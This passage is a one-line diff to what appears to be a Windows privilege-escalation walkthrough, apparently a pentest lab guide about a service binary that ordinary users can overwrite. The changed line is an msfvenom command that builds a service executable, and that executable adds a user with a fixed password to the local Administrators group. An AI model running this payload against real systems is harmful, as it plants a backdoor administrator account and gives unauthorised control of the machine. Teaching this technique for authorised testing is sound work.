@@ -37,7 +37,7 @@ In this example, the binary `C:\backups\backupsvc.exe` has **BUILTIN\Users:(F)**
 On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:
 
 ```bash
-msfvenom -p windows/exec CMD="net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o adduser.exe
+msfvenom -p windows/exec CMD="net user taskmgrsvc Password123! /add; net localgroup administrators taskmgrsvc /add" -f exe-service -o adduser.exe
 ```
 
 - **Payload**: `windows/exec` runs arbitrary commands.
